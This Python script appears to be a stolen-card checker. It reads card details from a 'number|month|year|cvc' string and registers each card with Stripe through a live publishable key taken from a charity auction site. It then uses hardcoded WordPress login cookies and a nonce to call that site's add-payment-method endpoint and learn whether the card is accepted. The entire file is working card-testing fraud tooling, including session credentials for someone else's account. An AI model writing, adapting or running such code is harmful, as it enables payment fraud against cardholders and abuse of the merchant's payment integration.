import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fe4b3a3b372%3B+stripe-js-v3%2Fe4b3a3b372%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fauctions.villagemissions.ca&time_on_page=65581&client_attribution_metadata[client_session_id]=bd89ee1c-9ed4-4319-b22d-e32b53ce46e8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=f9693e72-dc19-4b43-a72f-1313f78e89aa&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51GE2waGPXGoRNMCoydfJx1tgP9sZTkvtzAs3Nbt3ZNoEIqLGXmaBduQy8kAn3MbiM7Ydavn2GccXMoltiU1s4QkI002CiXYXxh&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'wordpress_sec_073d82570be277467757b0badec83214': 'sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C6423a2f675294d77b0e767cf4bb4cd68125ba0858a746d3e1c19448fcdefa9aa',
	    '_gid': 'GA1.2.873290409.1772300131',
	    'wordpress_logged_in_073d82570be277467757b0badec83214': 'sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C3367604e66dd4aa30d27b87c3447ffbd38b2ac46723da1c54a812842bd8187c6',
	    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauctions.villagemissions.ca%2Fshop%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_SRB47NYP0B': 'GS2.1.s1772300129$o1$g1$t1772300181$j8$l0$h0',
	    '_ga': 'GA1.2.592858208.1772300130',
	    '__stripe_mid': 'e02dbbe4-9af2-40f6-b6d6-9294df166ecb01a69a',
	    '__stripe_sid': '9cb9ad5e-7d6a-404f-bf3f-73bc307fbe612eeae0',
	}
	
	headers = {
	    'authority': 'auctions.villagemissions.ca',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_073d82570be277467757b0badec83214=sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C6423a2f675294d77b0e767cf4bb4cd68125ba0858a746d3e1c19448fcdefa9aa; _gid=GA1.2.873290409.1772300131; wordpress_logged_in_073d82570be277467757b0badec83214=sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C3367604e66dd4aa30d27b87c3447ffbd38b2ac46723da1c54a812842bd8187c6; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauctions.villagemissions.ca%2Fshop%2Fmy-account%2Fadd-payment-method%2F; _ga_SRB47NYP0B=GS2.1.s1772300129$o1$g1$t1772300181$j8$l0$h0; _ga=GA1.2.592858208.1772300130; __stripe_mid=e02dbbe4-9af2-40f6-b6d6-9294df166ecb01a69a; __stripe_sid=9cb9ad5e-7d6a-404f-bf3f-73bc307fbe612eeae0',
	    'origin': 'https://auctions.villagemissions.ca',
	    'referer': 'https://auctions.villagemissions.ca/shop/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': pm,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'b0409d6a5d',
	}
	
	r2 = requests.post(
	    'https://auctions.villagemissions.ca/wp-admin/admin-ajax.php',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
